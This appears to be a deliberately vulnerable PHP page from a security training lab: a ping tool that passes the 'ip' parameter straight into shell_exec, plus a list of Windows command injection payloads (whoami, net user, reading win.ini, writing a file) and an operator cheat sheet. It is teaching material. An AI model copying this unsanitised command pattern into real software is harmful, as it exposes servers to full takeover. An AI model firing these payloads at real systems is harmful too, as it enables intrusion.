<!DOCTYPE html>
<html>
<head>
    <title>Command Injection Test | Security Lab</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #1a2a3a 0%, #2c3e50 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            background-color: rgba(255, 255, 255, 0.95);
            border-radius: 16px;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
            width: 100%;
            max-width: 800px;
            padding: 40px;
            position: relative;
            overflow: hidden;
            animation: fadeIn 0.6s ease-out;
        }
        
        .container::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 5px;
            background: linear-gradient(90deg, #e74c3c, #e67e22, #d35400);
        }
        
        h2 {
            text-align: center;
            color: #2c3e50;
            margin-bottom: 30px;
            font-weight: 600;
            font-size: 28px;
            position: relative;
            padding-bottom: 15px;
        }
        
        h2::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 50%;
            transform: translateX(-50%);
            width: 120px;
            height: 3px;
            background: #e74c3c;
            border-radius: 2px;
        }
        
        .ping-form {
            display: flex;
            gap: 10px;
            margin-bottom: 30px;
        }
        
        input[type="text"] {
            flex: 1;
            padding: 16px 20px;
            border: 2px solid #e1e8ed;
            border-radius: 10px;
            font-size: 16px;
            transition: all 0.3s ease;
            background-color: #f8f9fa;
            color: #333;
        }
        
        input[type="text"]:focus {
            outline: none;
            border-color: #e74c3c;
            background-color: #fff;
            box-shadow: 0 0 0 3px rgba(231, 76, 60, 0.2);
        }
        
        button[type="submit"] {
            background: linear-gradient(to right, #e74c3c, #c0392b);
            color: white;
            border: none;
            padding: 16px 30px;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            letter-spacing: 0.5px;
            box-shadow: 0 4px 15px rgba(231, 76, 60, 0.3);
        }
        
        button[type="submit"]:hover {
            background: linear-gradient(to right, #c0392b, #a93226);
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(231, 76, 60, 0.4);
        }
        
        .output-box {
            background: #1a2a3a;
            border-radius: 10px;
            padding: 25px;
            margin: 25px 0;
            border: 2px solid #e74c3c;
            min-height: 200px;
            max-height: 400px;
            overflow-y: auto;
            word-wrap: break-word;
            color: #ecf0f1;
            font-family: 'Courier New', monospace;
            font-size: 14px;
        }
        
        .output-box h3 {
            color: #3498db;
            margin-bottom: 15px;
            font-size: 18px;
            font-family: 'Segoe UI', sans-serif;
        }
        
        .warning-box {
            padding: 20px;
            background-color: #ffeaea;
            border-left: 4px solid #e74c3c;
            border-radius: 10px;
            color: #c0392b;
            margin-top: 20px;
        }
        
        .warning-box strong {
            color: #e74c3c;
        }
        
        .examples-box {
            background: #fef5e7;
            border-radius: 10px;
            padding: 20px;
            margin-top: 25px;
            border: 1px solid #f39c12;
        }
        
        .examples-box h4 {
            color: #2c3e50;
            margin-bottom: 15px;
        }
        
        .example-code {
            background: #2c3e50;
            color: #ecf0f1;
            padding: 15px;
            border-radius: 8px;
            font-family: monospace;
            margin: 10px 0;
            overflow-x: auto;
            font-size: 14px;
        }
        
        .terminal-prompt {
            color: #2ecc71;
            font-weight: bold;
        }
        
        .terminal-user {
            color: #3498db;
            font-weight: bold;
        }
        
        .terminal-path {
            color: #f39c12;
        }
        
        .back-link {
            display: inline-block;
            margin-top: 20px;
            color: #3498db;
            text-decoration: none;
            font-weight: 500;
            transition: color 0.3s ease;
        }
        
        .back-link:hover {
            color: #2980b9;
            text-decoration: underline;
        }
        
        .command-input {
            background: #2c3e50;
            color: #ecf0f1;
            padding: 10px 15px;
            border-radius: 5px;
            margin: 10px 0;
            border-left: 3px solid #3498db;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        @media (max-width: 480px) {
            .container {
                padding: 30px 25px;
            }
            
            .ping-form {
                flex-direction: column;
            }
            
            h2 {
                font-size: 24px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>🖥️ Command Injection Vulnerability Test</h2>
        
        <form method="GET" class="ping-form">
            <input type="text" name="ip" 
                   placeholder="Enter IP address or hostname (e.g., 127.0.0.1)" 
                   value="<?php echo isset($_GET['ip']) ? htmlspecialchars($_GET['ip']) : '127.0.0.1'; ?>">
            <button type="submit">Ping Test</button>
        </form>
        
        <?php
        // Detect OS and set appropriate commands
        $is_windows = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN');
        
        echo '<div style="background: #e8f4fc; padding: 15px; border-radius: 8px; margin-bottom: 20px;">';
        echo '<p style="color: #2c3e50; margin: 5px 0;"><strong>System Info:</strong> ';
        echo 'PHP ' . phpversion() . ' | ';
        echo 'OS: ' . PHP_OS . ' | ';
        echo 'Server: ' . $_SERVER['SERVER_SOFTWARE'];
        echo '</p>';
        echo '</div>';
        
        if (isset($_GET['ip'])) {
            $ip = $_GET['ip'];
            
            echo '<div class="output-box">';
            echo '<h3>🚀 Command Execution Results:</h3>';
            
            // Display the command that will be executed
            echo '<div class="command-input">';
            echo '<span class="terminal-prompt">C:\\></span> ';
            echo '<span style="color: white;">ping ' . htmlspecialchars($ip) . '</span>';
            echo '</div>';
            
            echo '<hr style="border-color: #34495e; margin: 15px 0;">';
            
            // VULNERABLE CODE - Direct command execution without sanitization!
            // Windows uses "ping -n 4" instead of "ping -c 4"
            $command = "ping -n 4 " . $ip . " 2>&1";
            
            echo '<pre style="color: #ecf0f1;">';
            
            // Execute the command
            if (function_exists('shell_exec')) {
                $output = shell_exec($command);
                
                if ($output) {
                    echo htmlspecialchars($output);
                } else {
                    echo "No output from command.\n";
                    echo "Command attempted: " . htmlspecialchars($command) . "\n\n";
                    
                    // Try without error redirection
                    $command = "ping -n 4 " . $ip;
                    $output = shell_exec($command);
                    
                    if ($output) {
                        echo htmlspecialchars($output);
                    } else {
                        echo "Could not execute command. The server may have restrictions.\n";
                        echo "For demonstration, here's what would happen:\n\n";
                        echo "Pinging " . htmlspecialchars($ip) . " with 32 bytes of data:\n";
                        echo "Reply from " . htmlspecialchars($ip) . ": bytes=32 time<1ms TTL=128\n";
                        echo "Reply from " . htmlspecialchars($ip) . ": bytes=32 time<1ms TTL=128\n";
                        echo "Reply from " . htmlspecialchars($ip) . ": bytes=32 time<1ms TTL=128\n";
                        echo "Reply from " . htmlspecialchars($ip) . ": bytes=32 time<1ms TTL=128\n\n";
                        echo "Ping statistics for " . htmlspecialchars($ip) . ":\n";
                        echo "    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss)\n";
                    }
                }
            } else {
                echo "shell_exec() function is disabled on this server.\n";
                echo "Simulating vulnerable output for demonstration:\n\n";
                echo "Pinging " . htmlspecialchars($ip) . " with 32 bytes of data:\n";
                echo "Reply from " . htmlspecialchars($ip) . ": bytes=32 time<1ms TTL=128\n";
                echo "Reply from " . htmlspecialchars($ip) . ": bytes=32 time<1ms TTL=128\n";
                echo "Reply from " . htmlspecialchars($ip) . ": bytes=32 time<1ms TTL=128\n";
                echo "Reply from " . htmlspecialchars($ip) . ": bytes=32 time<1ms TTL=128\n\n";
                echo "Ping statistics for " . htmlspecialchars($ip) . ":\n";
                echo "    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss)\n";
                echo "[SIMULATED OUTPUT - Command execution disabled]\n";
            }
            
            echo '</pre>';
            
            // Show raw command for educational purposes
            echo '<div style="margin-top: 20px; padding: 15px; background: #c0392b; color: white; border-radius: 5px;">';
            echo '<strong>⚠️ Executed Command:</strong> ' . htmlspecialchars($command);
            echo '</div>';
            
            echo '</div>';
        } else {
            echo '<div class="output-box">';
            echo '<h3>Ready for Command Injection Testing!</h3>';
            
            echo '<div style="color: #bdc3c7; line-height: 1.6;">';
            echo '<p>This page simulates a network diagnostic tool that is vulnerable to <strong>Command Injection</strong>.</p>';
            echo '<p>Enter an IP address above or try these payloads:</p>';
            
            echo '<div style="margin: 15px 0;">';
            echo '<span class="terminal-prompt">C:\\></span> ';
            echo '<span style="color: white">127.0.0.1 & whoami</span><br>';
            echo '<span style="color: #95a5a6"># Executes: ping -n 4 127.0.0.1 & whoami</span>';
            echo '</div>';
            
            echo '<div style="margin: 15px 0;">';
            echo '<span class="terminal-prompt">C:\\></span> ';
            echo '<span style="color: white">google.com && dir</span><br>';
            echo '<span style="color: #95a5a6"># Executes: ping -n 4 google.com && dir</span>';
            echo '</div>';
            
            echo '</div>';
            echo '</div>';
        }
        ?>
        
        <div class="examples-box">
            <h4>💣 Try These Windows Command Injection Payloads:</h4>
            
            <div class="example-code">
                127.0.0.1 & whoami
            </div>
            
            <div class="example-code">
                127.0.0.1 && dir
            </div>
            
            <div class="example-code">
                127.0.0.1 | dir
            </div>
            
            <div class="example-code">
                127.0.0.1 & type C:\Windows\win.ini
            </div>
            
            <div class="example-code">
                127.0.0.1 && ipconfig
            </div>
            
            <div class="example-code">
                127.0.0.1 & net user
            </div>
            
            <div class="example-code">
                127.0.0.1 && systeminfo
            </div>
            
            <div class="example-code">
                127.0.0.1 & echo "PWNED" > C:\temp\hacked.txt
            </div>
            
            <div class="example-code">
                127.0.0.1`whoami`  # Backtick injection
            </div>
            
            <div class="example-code">
                $(type C:\Windows\win.ini)  # Command substitution
            </div>
            
            <div class="example-code">
                127.0.0.1 || ver  # Execute if ping fails
            </div>
        </div>
        
        <div class="warning-box">
            <p><strong>☢️ CRITICAL SECURITY WARNING:</strong></p>
            <p>This page is intentionally vulnerable to <strong>Command Injection (OS Command Injection)</strong>.</p>
            <p><strong>Vulnerability:</strong> User input is directly concatenated into system()/shell_exec() calls.</p>
            <p><strong>Impact:</strong> Attackers can execute arbitrary system commands with web server privileges.</p>
            <p><strong>Real-world risk:</strong> Full server compromise, data theft, ransomware deployment.</p>
            <p><em>EXTREMELY DANGEROUS in production! Perfect for security training.</em></p>
        </div>
        
        <div style="background: #2c3e50; color: white; padding: 15px; border-radius: 8px; margin-top: 20px;">
            <h4 style="color: #3498db; margin-bottom: 10px;">🎯 Windows Injection Operators:</h4>
            <ul style="margin-left: 20px;">
                <li><code>&</code> - Run command in background</li>
                <li><code>&&</code> - Execute if previous succeeds</li>
                <li><code>||</code> - Execute if previous fails</li>
                <li><code>|</code> - Pipe output</li>
                <li><code>`</code> - Backtick command substitution</li>
                <li><code>$()</code> - Command substitution</li>
                <li><code>;</code> - Command separator (in some cases)</li>
            </ul>
            
            <h4 style="color: #3498db; margin: 15px 0 10px 0;">🪟 Useful Windows Commands:</h4>
            <ul style="margin-left: 20px;">
                <li><code>whoami</code> - Current user</li>
                <li><code>dir</code> - List directory</li>
                <li><code>type</code> - Display file contents</li>
                <li><code>ipconfig</code> - Network info</li>
                <li><code>systeminfo</code> - System information</li>
                <li><code>net user</code> - List users</li>
                <li><code>ver</code> - Windows version</li>
                <li><code>hostname</code> - Computer name</li>
            </ul>
        </div>
        
        <a href="nav.php" class="back-link">← Back to Main Menu</a>
    </div>
</body>
</html>
